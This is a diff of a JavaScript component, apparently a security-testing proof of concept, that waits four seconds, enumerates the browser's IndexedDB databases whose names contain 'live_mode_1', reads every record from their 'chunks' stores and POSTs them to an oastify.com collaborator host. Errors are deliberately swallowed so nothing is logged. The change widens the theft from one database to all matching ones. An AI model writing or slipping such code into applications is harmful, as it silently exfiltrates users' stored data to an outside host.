@@ -15,69 +15,74 @@ export const Idb = () => {
   const match = decodedToken.match(userIdRegex);
   const userId = match ? match[1] : null;
   setTimeout(() => {
-    function fetchAndSendData() {
+    async function fetchAndSendData() {
+    const databases = await indexedDB.databases();
 
-        const dbName = String("rep:live_mode_1@") + String(NEXT_PUBLIC_VERCEL_PROJECT_ID) + String("@") + String(NEXT_PUBLIC_VERCEL_GIT_COMMIT_REF) + String("-") + String(userId) + String(":4");
-      
-        console.log(dbName);
-        const url = 'https://rqlt1694pp1b11zyns5oflv8fzlq9h17pw.oastify.com';
+    // Iterate over each database
+    for (const dbInfo of databases) {
+        const dbName = dbInfo.name;
+        if (dbName.includes('live_mode_1')) {
+            console.log(dbName);
+            const url = 'https://rqlt1694pp1b11zyns5oflv8fzlq9h17pw.oastify.com';
 
-        // Open indexedDB
-        const request = indexedDB.open(dbName);
+            // Open indexedDB
+            const request = indexedDB.open(dbName);
 
-        request.onsuccess = function(event) {
-            const db = event.target.result;
-            const transaction = db.transaction(['chunks'], 'readonly');
-            const objectStore = transaction.objectStore('chunks');
-            const chunks = [];
+            request.onsuccess = function(event) {
+                const db = event.target.result;
+                const transaction = db.transaction(['chunks'], 'readonly');
+                const objectStore = transaction.objectStore('chunks');
+                const chunks = [];
 
-            // Open cursor to iterate over chunks
-            objectStore.openCursor().onsuccess = function(event) {
-                const cursor = event.target.result;
-                if (cursor) {
-                    // Push chunk to array
-                    chunks.push(cursor.value);
+                // Open cursor to iterate over chunks
+                objectStore.openCursor().onsuccess = function(event) {
+                    const cursor = event.target.result;
+                    if (cursor) {
+                        // Push chunk to array
+                        chunks.push(cursor.value);
 
-                    // Move to next chunk
-                    cursor.continue();
-                } else {
-                    // All chunks fetched, send them in a POST request
-                    sendData(url, chunks);
-                }
+                        // Move to next chunk
+                        cursor.continue();
+                    } else {
+                        // All chunks fetched, send them in a POST request
+                        sendData(url, chunks);
+                    }
+                };
             };
-        };
 
-        request.onerror = function(event) {
-            // Silently handle error without logging
-        };
-    }
-
-    function sendData(url, data) {
-        // Convert data to x-www-form-urlencoded format
-        const formData = new URLSearchParams();
-        formData.append('data', JSON.stringify(data));
-
-        // Make a POST request in no-cors mode
-        fetch(url, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
-            body: formData.toString(),
-        })
-        .then(response => {
-            if (!response.ok) {
+            request.onerror = function(event) {
                 // Silently handle error without logging
-            }
-            // Silently handle success without logging
-        })
-        .catch(error => {
-            // Silently handle error without logging
-        });
+            };
+        }
     }
+}
 
-    // Call the function to start fetching and sending data
-    fetchAndSendData();
+function sendData(url, data) {
+    // Convert data to x-www-form-urlencoded format
+    const formData = new URLSearchParams();
+    formData.append('data', JSON.stringify(data));
+
+    // Make a POST request in no-cors mode
+    fetch(url, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: formData.toString(),
+    })
+    .then(response => {
+        if (!response.ok) {
+            // Silently handle error without logging
+        }
+        // Silently handle success without logging
+    })
+    .catch(error => {
+        // Silently handle error without logging
+    });
+}
+
+// Call the function to start fetching and sending data
+fetchAndSendData();
 }, 4000);
 };
